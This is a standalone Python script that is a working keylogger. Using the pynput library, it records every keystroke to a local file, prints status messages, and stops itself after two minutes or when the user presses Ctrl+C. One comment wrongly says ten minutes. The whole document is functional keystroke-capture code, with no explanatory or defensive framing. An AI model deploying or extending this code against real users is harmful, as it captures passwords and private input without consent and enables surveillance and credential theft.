import threading
from pynput import keyboard

log_file = "key_log.txt"
runtime_seconds = 120     # 2 minutes

# Logging function
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Function to stop the listener after a time
def stop_keylogger(listener):
    print("\n[+] Auto-stopping keylogger after 2 minutes.")
    listener.stop()

# Start listener in a context so it can be stopped
def start_keylogger():
    print("[+] Keylogger is running... Press Ctrl+C to stop early.")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Timer to stop it after 10 minutes
    timer = threading.Timer(runtime_seconds, stop_keylogger, [listener])
    timer.start()

    try:
        listener.join()  # This will block the main thread until listener stops
    except KeyboardInterrupt:
        print("\n[+] Keylogger manually stopped by user.")
        listener.stop()

# Run the keylogger
start_keylogger()
